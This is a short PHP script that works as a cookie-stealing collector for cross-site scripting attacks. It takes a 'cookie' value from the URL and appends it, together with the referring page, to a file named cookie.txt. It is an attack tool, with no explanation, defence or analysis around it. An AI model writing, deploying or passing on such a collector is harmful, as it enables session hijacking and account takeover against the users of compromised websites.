<?php
if(isset($_GET['cookie']))
{
	$cookie = $_GET['cookie'];
	$f = fopen('cookie.txt','a');
	fwrite($f, $_SERVER['HTTP_REFERER']);
	fwrite($f,". Cookie la: ".$cookie."\n");
	fclose($f);
}
?>
